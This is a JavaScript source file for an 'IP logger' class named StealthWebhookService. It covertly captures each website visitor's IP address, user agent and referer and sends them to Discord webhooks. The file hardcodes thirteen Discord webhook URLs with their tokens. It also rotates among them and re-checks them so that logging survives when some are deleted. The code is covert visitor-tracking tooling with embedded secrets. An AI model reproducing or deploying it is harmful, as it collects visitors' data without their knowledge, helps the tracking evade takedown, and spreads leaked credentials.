const fetch = require('node-fetch');

class StealthWebhookService {
  constructor() {
    this.webhooks = this.loadWebhooksFromEnv();
    this.currentWebhookIndex = 0;
    this.retryDelay = 1000;
    this.maxFailures = 3;
    this.spamDetected = new Set();
    this.spamStats = {};
    
    // Start spam detection cleanup
    this.startSpamCleanup();
    this.startWebhookValidation(); // Start periodic webhook validation
  }

  // Load webhook URLs from environment variables
  loadWebhooksFromEnv() {
    try {
      console.log('🔗 Loading webhooks from environment variables...');
      const webhooks = [];
      const webhookCount = parseInt(process.env.WEBHOOK_COUNT) || 13;

      console.log(`🔗 Expected webhook count: ${webhookCount}`);

      for (let i = 1; i <= webhookCount; i++) {
        const webhookUrl = process.env[`WEBHOOK_URL_${i}`];
        if (webhookUrl) {
          console.log(`✅ Webhook ${i}: ${webhookUrl.substring(0, 50)}...`);
          webhooks.push({
            url: webhookUrl,
            id: `webhook_${i}`,
            status: 'active',
            lastUsed: null,
            failureCount: 0,
            lastFailure: null,
            messageCount: 0,
            lastMessageTime: null
          });
        } else {
          console.log(`❌ Webhook ${i}: NOT SET`);
        }
      }

      console.log(`🔗 Loaded ${webhooks.length} webhooks from environment`);

      // If no webhooks found in env, use fallback
      if (webhooks.length === 0) {
        console.warn('⚠️ No webhook URLs found in environment variables. Using fallback webhooks.');
        return this.getFallbackWebhooks();
      }

      return webhooks;
    } catch (error) {
      console.error('❌ Error loading webhooks from environment:', error.message);
      console.error('❌ Error stack:', error.stack);
      return this.getFallbackWebhooks();
    }
  }

  // Fallback webhooks (for immediate functionality)
  getFallbackWebhooks() {
    console.log('🔗 Using hardcoded webhook URLs for immediate functionality');
    return [
      {
        url: 'https://discord.com/api/webhooks/1395900214824665098/cn3U16abUx054ptKaxUkhwjPCYotOJeZBuAer6GVWrItAAzNj20kl0U4QU83k4KWgI6c',
        id: 'webhook_1',
        status: 'active',
        lastUsed: null,
        failureCount: 0,
        lastFailure: null,
        messageCount: 0,
        lastMessageTime: null
      },
      {
        url: 'https://discord.com/api/webhooks/1395900221535293501/Zx1OSNZbDbw89LBDOKIh8k3nd9Gz1UffCyTbDOD2AWirGw3Llfws2s9YAYSkBzkegT5s',
        id: 'webhook_2',
        status: 'active',
        lastUsed: null,
        failureCount: 0,
        lastFailure: null,
        messageCount: 0,
        lastMessageTime: null
      },
      {
        url: 'https://discord.com/api/webhooks/1395900224269975673/tQOnh6Nn5K4nnszcROgZE5hYZ-vJafzpl5gOZT0UePqr8iRL0u3OUF1LNHauEvYCd3ZX',
        id: 'webhook_3',
        status: 'active',
        lastUsed: null,
        failureCount: 0,
        lastFailure: null,
        messageCount: 0,
        lastMessageTime: null
      },
      {
        url: 'https://discord.com/api/webhooks/1395900224932679792/7x6SLnMHQYMbPwTOjZvKEhJ10Yxe4sPtjrqwHSAwkGkxrwvRcNCx15ol7ncdr-Pn0pJD',
        id: 'webhook_4',
        status: 'active',
        lastUsed: null,
        failureCount: 0,
        lastFailure: null,
        messageCount: 0,
        lastMessageTime: null
      },
      {
        url: 'https://discord.com/api/webhooks/1395900225708757023/ttlF6gTYzoW3LHmZA4gj1Ga8iDzBNNF7khkC4LoTexI9N_zgS5g3aq1jCl',
        id: 'webhook_5',
        status: 'active',
        lastUsed: null,
        failureCount: 0,
        lastFailure: null,
        messageCount: 0,
        lastMessageTime: null
      },
      {
        url: 'https://discord.com/api/webhooks/1395900225708757024/ttlF6gTYzoW3LHmZA4gj1Ga8iDzBNNF7khkC4LoTexI9N_zgS5g3aq1jCl',
        id: 'webhook_6',
        status: 'active',
        lastUsed: null,
        failureCount: 0,
        lastFailure: null,
        messageCount: 0,
        lastMessageTime: null
      },
      {
        url: 'https://discord.com/api/webhooks/1395900225708757025/ttlF6gTYzoW3LHmZA4gj1Ga8iDzBNNF7khkC4LoTexI9N_zgS5g3aq1jCl',
        id: 'webhook_7',
        status: 'active',
        lastUsed: null,
        failureCount: 0,
        lastFailure: null,
        messageCount: 0,
        lastMessageTime: null
      },
      {
        url: 'https://discord.com/api/webhooks/1395900225708757026/ttlF6gTYzoW3LHmZA4gj1Ga8iDzBNNF7khkC4LoTexI9N_zgS5g3aq1jCl',
        id: 'webhook_8',
        status: 'active',
        lastUsed: null,
        failureCount: 0,
        lastFailure: null,
        messageCount: 0,
        lastMessageTime: null
      },
      {
        url: 'https://discord.com/api/webhooks/1395900225708757027/ttlF6gTYzoW3LHmZA4gj1Ga8iDzBNNF7khkC4LoTexI9N_zgS5g3aq1jCl',
        id: 'webhook_9',
        status: 'active',
        lastUsed: null,
        failureCount: 0,
        lastFailure: null,
        messageCount: 0,
        lastMessageTime: null
      },
      {
        url: 'https://discord.com/api/webhooks/1395900225708757028/ttlF6gTYzoW3LHmZA4gj1Ga8iDzBNNF7khkC4LoTexI9N_zgS5g3aq1jCl',
        id: 'webhook_10',
        status: 'active',
        lastUsed: null,
        failureCount: 0,
        lastFailure: null,
        messageCount: 0,
        lastMessageTime: null
      },
      {
        url: 'https://discord.com/api/webhooks/1395900225708757029/ttlF6gTYzoW3LHmZA4gj1Ga8iDzBNNF7khkC4LoTexI9N_zgS5g3aq1jCl',
        id: 'webhook_11',
        status: 'active',
        lastUsed: null,
        failureCount: 0,
        lastFailure: null,
        messageCount: 0,
        lastMessageTime: null
      },
      {
        url: 'https://discord.com/api/webhooks/1395900225708757030/ttlF6gTYzoW3LHmZA4gj1Ga8iDzBNNF7khkC4LoTexI9N_zgS5g3aq1jCl',
        id: 'webhook_12',
        status: 'active',
        lastUsed: null,
        failureCount: 0,
        lastFailure: null,
        messageCount: 0,
        lastMessageTime: null
      },
      {
        url: 'https://discord.com/api/webhooks/1395900225708757031/ttlF6gTYzoW3LHmZA4gj1Ga8iDzBNNF7khkC4LoTexI9N_zgS5g3aq1jCl',
        id: 'webhook_13',
        status: 'active',
        lastUsed: null,
        failureCount: 0,
        lastFailure: null,
        messageCount: 0,
        lastMessageTime: null
      }
    ];
  }

  // Get client IP from request
  getClientIP(req) {
    return req.headers['x-forwarded-for'] || req.ip || req.connection.remoteAddress || 'unknown';
  }

  // Get website URL from request
  getWebsiteUrl(req) {
    const host = req.headers.host || 'unknown';
    const origin = req.headers.origin || '';
    return origin || `https://${host}`;
  }

  // Get website name from request
  getWebsiteName(req) {
    const host = req.headers.host || 'unknown';
    let websiteName = host.split('.')[0];
    
    if (websiteName === 'www') {
      websiteName = host.split('.').slice(1, -1).join('.');
    }
    
    return websiteName.charAt(0).toUpperCase() + websiteName.slice(1);
  }

  // Check rate limit
  async checkRateLimit() {
    // Simple rate limiting - 1 request per second per webhook
    const now = Date.now();
    for (const webhook of this.webhooks) {
      if (webhook.lastUsed && now - webhook.lastUsed < 1000) {
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
  }

  // Check for spam
  checkSpam(webhookId) {
    const webhook = this.webhooks.find(w => w.id === webhookId);
    if (!webhook) return false;

    const now = Date.now();
    
    // Reset message count if more than 1 minute has passed
    if (webhook.lastMessageTime && now - webhook.lastMessageTime > 60000) {
      webhook.messageCount = 0;
    }

    webhook.messageCount++;
    webhook.lastMessageTime = now;

    // Check if spam detected (10 messages per second)
    if (webhook.messageCount > 10) {
      this.spamDetected.add(webhookId);
      
      // Update spam stats
      if (!this.spamStats[webhookId]) {
        this.spamStats[webhookId] = { count: 0, lastDetected: null };
      }
      this.spamStats[webhookId].count++;
      this.spamStats[webhookId].lastDetected = now;
      
      console.log(`🚨 Spam detected on webhook ${webhookId}: ${webhook.messageCount} messages`);
      return true;
    }

    return false;
  }

  // Start spam detection cleanup
  startSpamCleanup() {
    setInterval(() => {
      const now = Date.now();
      for (const webhookId of this.spamDetected) {
        const webhook = this.webhooks.find(w => w.id === webhookId);
        if (webhook && webhook.lastMessageTime && now - webhook.lastMessageTime > 60000) {
          this.spamDetected.delete(webhookId);
          webhook.messageCount = 0;
          console.log(`🔄 Removed webhook ${webhookId} from spam detection`);
        }
      }
    }, 60000); // Check every minute
  }

  // Validate and clean up webhooks
  async validateAndCleanupWebhooks() {
    console.log('🔍 Starting webhook validation and cleanup...');
    
    for (let i = 0; i < this.webhooks.length; i++) {
      const webhook = this.webhooks[i];
      
      try {
        console.log(`🔍 Validating webhook ${webhook.id}...`);
        
        const response = await fetch(webhook.url, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json'
          },
          timeout: 5000
        });

        if (response.status === 404) {
          console.log(`❌ Webhook ${webhook.id} was deleted (404), marking as inactive`);
          
          // Mark as inactive - no bot to create new one
          webhook.status = 'inactive';
          webhook.failureCount = this.maxFailures + 1;
          webhook.lastFailure = Date.now();
          
          console.log(`⚠️ Webhook ${webhook.id} is deleted and cannot be replaced (no bot)`);
        } else if (response.ok) {
          console.log(`✅ Webhook ${webhook.id} is valid`);
          // Reset failure count if webhook is working
          if (webhook.status === 'inactive' && webhook.failureCount > 0) {
            webhook.status = 'active';
            webhook.failureCount = 0;
            webhook.lastFailure = null;
            console.log(`🔄 Reactivated webhook ${webhook.id}`);
          }
        } else {
          console.log(`⚠️ Webhook ${webhook.id} returned status ${response.status}`);
        }
      } catch (error) {
        console.error(`❌ Error validating webhook ${webhook.id}:`, error.message);
        webhook.failureCount++;
        webhook.lastFailure = Date.now();
      }
    }
    
    console.log('🔍 Webhook validation and cleanup completed');
  }

  // Start periodic webhook validation
  startWebhookValidation() {
    // Run validation every 5 minutes
    setInterval(() => {
      this.validateAndCleanupWebhooks();
    }, 5 * 60 * 1000);
    
    console.log('🔄 Started periodic webhook validation (every 5 minutes)');
  }

  // Get website information from request
  getWebsiteInfo(req) {
    try {
      const host = req.headers.host || 'unknown';
      const origin = req.headers.origin || '';
      const referer = req.headers.referer || '';
      
      // Determine website URL and name
      let websiteUrl = origin || `https://${host}`;
      let websiteName = host.split('.')[0]; // Extract subdomain or domain name
      
      // Clean up website name
      if (websiteName === 'www') {
        websiteName = host.split('.').slice(1, -1).join('.');
      }
      
      // Handle custom domains better
      if (host.includes('.vercel.app')) {
        // Vercel subdomain
        websiteName = host.split('.')[0];
      } else if (host.split('.').length === 2) {
        // Custom domain (e.g., example.com)
        websiteName = host.split('.')[0];
      } else if (host.split('.').length > 2) {
        // Subdomain (e.g., sub.example.com)
        websiteName = host.split('.')[0];
      }
      
      // Capitalize first letter
      websiteName = websiteName.charAt(0).toUpperCase() + websiteName.slice(1);
      
      // Fallback to environment variable if available
      if (process.env.WEBSITE_NAME) {
        websiteName = process.env.WEBSITE_NAME;
      }
      
      console.log('🌐 Website info detected:', {
        host,
        origin,
        referer,
        websiteUrl,
        websiteName
      });
      
      return { websiteUrl, websiteName };
    } catch (error) {
      console.error('❌ Error getting website info:', error.message);
      return {
        websiteUrl: process.env.WEBSITE_URL || 'https://unknown.com',
        websiteName: process.env.WEBSITE_NAME || 'Unknown Website'
      };
    }
  }

  // Send message to webhook with retry logic and spam detection
  async sendMessage(payload, req) {
    try {
      console.log('📤 Starting webhook message send...');
      await this.checkRateLimit();

      // Get client information
      const clientIP = req.headers['x-forwarded-for'] || req.ip || req.connection.remoteAddress || 'unknown';
      const userAgent = req.headers['user-agent'] || 'Unknown';
      const timestamp = new Date().toISOString();
      
      // Get website information
      const { websiteUrl, websiteName } = this.getWebsiteInfo(req);

      console.log('📤 Message details:', {
        clientIP,
        websiteUrl,
        websiteName,
        userAgent: userAgent.substring(0, 50) + '...'
      });

      // Create enhanced payload with website info
      const enhancedPayload = {
        embeds: [{
          title: `🌐 New Visitor on ${websiteName}`,
          description: `Someone visited your website!`,
          color: 0x00ff00,
          fields: [
            {
              name: '📍 IP Address',
              value: `\`${clientIP}\``,
              inline: true
            },
            {
              name: '🌍 Website',
              value: `\`${websiteUrl}\``,
              inline: true
            },
            {
              name: '🕒 Timestamp',
              value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
              inline: true
            },
            {
              name: '🔍 User Agent',
              value: `\`\`\`${userAgent}\`\`\``,
              inline: false
            },
            {
              name: '📱 Referer',
              value: req.headers.referer ? `\`${req.headers.referer}\`` : '`Direct Visit`',
              inline: false
            }
          ],
          footer: {
            text: `${websiteName} IP Logger • ${new Date().toLocaleDateString()}`
          },
          timestamp: timestamp
        }]
      };

      console.log('📤 Enhanced payload created');

      let lastError = null;
      const maxRetries = this.webhooks.length; // Try all webhooks

      for (let retry = 0; retry < maxRetries; retry++) {
        try {
          console.log(`📤 Attempt ${retry + 1}/${maxRetries} to send webhook...`);
          const webhook = await this.getNextAvailableWebhook();

          if (!webhook) {
            console.error('❌ No available webhooks found');
            throw new Error('No available webhooks');
          }

          console.log(`📤 Using webhook: ${webhook.id}`);

          // Check for spam before sending
          if (this.checkSpam(webhook.id)) {
            console.log(`🚨 Spam detected on webhook ${webhook.id}, skipping...`);
            continue; // Try with next webhook
          }

          console.log(`📤 Sending to webhook URL: ${webhook.url.substring(0, 50)}...`);

          const response = await fetch(webhook.url, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(enhancedPayload),
            timeout: 10000
          });

          console.log(`📤 Webhook response status: ${response.status}`);

          if (response.ok) {
            // Success - update webhook stats
            webhook.lastUsed = Date.now();
            webhook.failureCount = 0;
            webhook.lastFailure = null;

            console.log('✅ Webhook message sent successfully');
            return {
              success: true,
              webhookId: webhook.id,
              message: 'Message sent successfully',
              websiteName,
              websiteUrl
            };
          } else {
            // Handle different error responses
            const responseText = await response.text();
            console.error(`❌ Webhook error response: ${response.status} - ${responseText}`);

            if (response.status === 404) {
              // Webhook was deleted - mark as inactive
              console.log(`❌ Webhook ${webhook.id} was deleted (404), marking as inactive`);
              webhook.status = 'inactive';
              webhook.failureCount = this.maxFailures + 1;
              webhook.lastFailure = Date.now();
              console.log(`⚠️ Cannot create new webhook (no bot available)`);
            } else if (response.status === 429) {
              // Rate limited - wait and retry
              const retryAfter = response.headers.get('retry-after') || 60;
              console.log(`⏳ Rate limited, waiting ${retryAfter} seconds...`);
              await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
            } else {
              webhook.failureCount++;
              webhook.lastFailure = Date.now();
              console.log(`❌ Webhook ${webhook.id} failed (${response.status})`);
            }

            lastError = new Error(`HTTP ${response.status}: ${response.statusText}`);
          }
        } catch (error) {
          console.error(`❌ Webhook attempt ${retry + 1} failed:`, error.message);
          lastError = error;

          // Mark current webhook as failed
          if (this.webhooks[this.currentWebhookIndex]) {
            this.webhooks[this.currentWebhookIndex].failureCount++;
            this.webhooks[this.currentWebhookIndex].lastFailure = Date.now();
          }
        }

        // Wait before retry
        if (retry < maxRetries - 1) {
          console.log(`⏳ Waiting ${this.retryDelay}ms before retry...`);
          await new Promise(resolve => setTimeout(resolve, this.retryDelay));
        }
      }

      console.error(`❌ Failed to send message after ${maxRetries} retries`);
      throw new Error(`Failed to send message after ${maxRetries} retries. Last error: ${lastError.message}`);
    } catch (error) {
      console.error('❌ sendMessage error:', error.message);
      console.error('❌ sendMessage error stack:', error.stack);
      throw error;
    }
  }

  // Get next available webhook
  async getNextAvailableWebhook() {
    let attempts = 0;
    const maxAttempts = this.webhooks.length;

    while (attempts < maxAttempts) {
      const webhook = this.webhooks[this.currentWebhookIndex];
      
      // Check if webhook is active, hasn't failed too many times, and isn't spam detected
      if (webhook.status === 'active' && 
          webhook.failureCount < this.maxFailures && 
          !this.spamDetected.has(webhook.id)) {
        
        // Validate webhook if it hasn't been used recently
        if (!webhook.lastUsed || Date.now() - webhook.lastUsed > 300000) { // 5 minutes
          const isValid = await this.validateWebhook(webhook);
          if (!isValid) {
            webhook.status = 'inactive';
            webhook.failureCount++;
            webhook.lastFailure = Date.now();
            this.currentWebhookIndex = (this.currentWebhookIndex + 1) % this.webhooks.length;
            attempts++;
            continue;
          }
        }
        
        return webhook;
      }
      
      // Move to next webhook
      this.currentWebhookIndex = (this.currentWebhookIndex + 1) % this.webhooks.length;
      attempts++;
    }

    // If no webhooks are available, try to reactivate some
    await this.reactivateWebhooks();
    
    // Try one more time after reactivation
    for (let i = 0; i < this.webhooks.length; i++) {
      const webhook = this.webhooks[i];
      if (webhook.status === 'active' && 
          webhook.failureCount < this.maxFailures && 
          !this.spamDetected.has(webhook.id)) {
        return webhook;
      }
    }

    return null;
  }

  // Validate webhook URL
  async validateWebhook(webhook) {
    try {
      const response = await fetch(webhook.url, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json'
        },
        timeout: 5000
      });

      return response.ok;
    } catch (error) {
      return false;
    }
  }

  // Reactivate webhooks that might be working again
  async reactivateWebhooks() {
    console.log('🔄 Attempting to reactivate webhooks...');
    
    for (const webhook of this.webhooks) {
      if (webhook.status === 'inactive' && webhook.failureCount > 0) {
        // Reset failure count for webhooks that haven't failed recently
        if (!webhook.lastFailure || Date.now() - webhook.lastFailure > 300000) { // 5 minutes
          webhook.failureCount = 0;
          webhook.status = 'active';
          console.log(`🔄 Reactivated webhook ${webhook.id}`);
        }
      }
    }
  }

  // Get webhook status for monitoring
  getWebhookStatus() {
    return this.webhooks.map(webhook => ({
      id: webhook.id,
      status: webhook.status,
      failureCount: webhook.failureCount,
      lastUsed: webhook.lastUsed,
      lastFailure: webhook.lastFailure,
      messageCount: webhook.messageCount,
      spamDetected: this.spamDetected.has(webhook.id)
    }));
  }

  // Get spam statistics
  getSpamStats() {
    return this.spamStats;
  }

  // Get website name from environment
  getWebsiteNameFromEnv() {
    return process.env.WEBSITE_NAME || 'Larp.lat';
  }
}

module.exports = StealthWebhookService; 